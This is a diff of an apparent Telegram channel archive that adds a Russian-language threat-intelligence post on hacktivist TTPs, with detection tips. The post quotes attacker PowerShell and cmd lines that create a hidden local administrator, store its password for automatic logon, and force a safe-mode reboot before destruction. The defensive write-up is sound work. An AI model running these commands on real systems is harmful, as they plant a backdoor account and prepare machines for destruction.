@@ -1,8 +1,15 @@
 {
   "channel": "detectioneasy",
-  "last_update": "2025-12-03T18:41:31.594908+00:00",
-  "messages_count": 42,
+  "last_update": "2025-12-04T04:36:47.408046+00:00",
+  "messages_count": 43,
   "messages": [
+    {
+      "id": "302",
+      "title": "Коллеги из ЛК поделились TTP хактивистских группировок 4BID, BO Team и Red Likho",
+      "text": "Всем привет! 💻✌️\nКоллеги из ЛК поделились TTP хактивистских группировок 4BID, BO Team и Red Likho\nДля подготовки инфраструктуры к уничтожению запускался ps1-скрипт, одна из возможностей которого создание локального пользователя с параметрами PasswordExpires, Disabled = FALSE и добавление его в группу локальных администраторов\n$userName = \"[REDACTED]\"\n$password = \"[REDACTED]\"\n$domain = \".\"\n$userExists = net user $userName 2>$null\n$addUser = net user $userName $password /add\nwmic useraccount where \"name='$userName'\" set PasswordExpires=FALSE | Write-Log\nwmic useraccount where \"name='$userName'\" set Disabled=FALSE | Write-Log\n$group = (Get-LocalGroup -SID \"S-1-5-32-544\").Name\nnet localgroup $group $userName /add | Write-Log\nДалее, хост настраивается для автоматического входа с созданным пользователем\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" \"AutoAdminLogon\" -Value \"1\" | Write-Log\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" \"DefaultUserName\" -Value $userName | Write-Log\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" \"DefaultPassword\" -Value $password | Write-Log\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" \"DefaultDomainName\" -Value $domain | Write-Log\nВторой индикатор подготовки к уничтожению — перевод системы в безопасный режим с сетью:\ncmd.exe /Q /c bcdedit /set {current} safeboot network && shutdown -r -f -t 0 1> \\Windows\\Temp\\WsMeHC 2>&1\n🔭 Обнаружение:\n🔤 мониторинг создания локальных пользователей и их добавления в группу администраторов\n🔤 хантим ключи реестра SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n🔤 отслеживаем запуск bcdedit /set {current} safeboot network\n#detection@detectioneasy\n#ttp@detectioneasy",
+      "link": "https://t.me/detectioneasy/302",
+      "pub_date": "2025-12-03T18:52:16+00:00"
+    },
     {
       "id": "300",
       "title": "Распространение вредоносов через USB-накопители остается актуальным способом. Цепочка заражения описана в отчете AhnLab и Google",
